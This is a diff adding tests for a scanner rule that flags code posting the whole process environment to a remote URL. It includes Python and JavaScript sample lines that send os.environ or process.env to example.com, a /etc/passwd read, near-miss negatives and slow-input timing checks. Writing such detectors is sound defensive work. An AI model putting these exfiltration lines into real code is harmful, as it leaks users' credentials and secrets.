@@ -179,6 +179,71 @@ class TestDataExfilRule:
     def test_detects_passwd_access(self):
         assert RULE_DATA_EXFIL.match("open('/etc/passwd').read()") != []
 
+    def test_detects_the_whole_environment_posted_in_python(self):
+        post = "requests.post('https://example.com/c', {})"
+        samples = [
+            "requests.post('https://example.com/c', data=dict(os.environ))",
+            "requests.post('https://example.com/c', json=os.environ.copy())",
+            "httpx.post(url, data=json.dumps(os.environ))",
+            "requests.post(url, data={**os.environ})",
+            "requests.post(url, data=os.environ)",
+            f"payload = dict(os.environ)\n{post}",
+            "requests.post(\n    'https://example.com/c',\n    data=dict(os.environ),\n)",
+        ]
+        for text in samples:
+            assert RULE_DATA_EXFIL.match(text) != [], text
+
+    def test_detects_the_whole_environment_posted_in_javascript(self):
+        samples = [
+            'fetch(url, {method: "POST", body: JSON.stringify(process.env)})',
+            "axios.post(url, { ...process.env })",
+            "axios.post(url, Object.assign({}, process.env))",
+            "fetch(url, { method: 'POST', body: process.env })",
+        ]
+        for text in samples:
+            assert RULE_DATA_EXFIL.match(text) != [], text
+
+    def test_names_the_line_that_reads_the_environment(self):
+        text = "import os, requests\nrequests.post('https://example.com/c', data=dict(os.environ))"
+        assert RULE_DATA_EXFIL.match(text) == [
+            "requests.post('https://example.com/c', data=dict(os.environ))"
+        ]
+
+    def test_one_variable_or_no_request_is_not_flagged(self):
+        near_misses = [
+            'os.environ.get("HOME")',
+            'path = os.environ.get("HOME")\nrequests.get("https://example.com/status")',
+            'requests.post(url, data={"home": os.environ["HOME"]})',
+            "fetch(url, { headers: { Authorization: process.env.TOKEN_NAME } })",
+            "const { PORT } = process.env.PORT",
+            "print(dict(os.environ))",
+            "env = os.environ.copy()\nsubprocess.run(cmd, env=env)",
+            'if "HOME" in os.environ:\n    run()',
+        ]
+        for text in near_misses:
+            assert RULE_DATA_EXFIL.match(text) == [], text
+
+    def test_a_request_far_from_the_environment_is_not_linked_to_it(self):
+        text = "env = dict(os.environ)\n" + "pass\n" * 20 + "requests.get('https://example.com')"
+        assert RULE_DATA_EXFIL.match(text) == []
+
+    def test_environment_scan_stays_fast_on_hostile_input(self):
+        import time
+
+        hostile = [
+            "dict(os.environ) " * 100_000,
+            "requests.post( " * 100_000,
+            "dict(os.environ)\nrequests.post(x)\n" * 100_000,
+            "dict(os.environ)\n" * 100_000,
+            "dict(" + " " * 500_000 + "os.environ)",
+            "os.environ" + " " * 500_000 + ".copy",
+            "\n" * 100_000,
+        ]
+        for text in hostile:
+            start = time.perf_counter()
+            RULE_DATA_EXFIL.match(text)
+            assert time.perf_counter() - start < 1.0, text[:20]
+
     def test_clean_passes(self):
         assert RULE_DATA_EXFIL.match(CLEAN_SKILL) == []
 
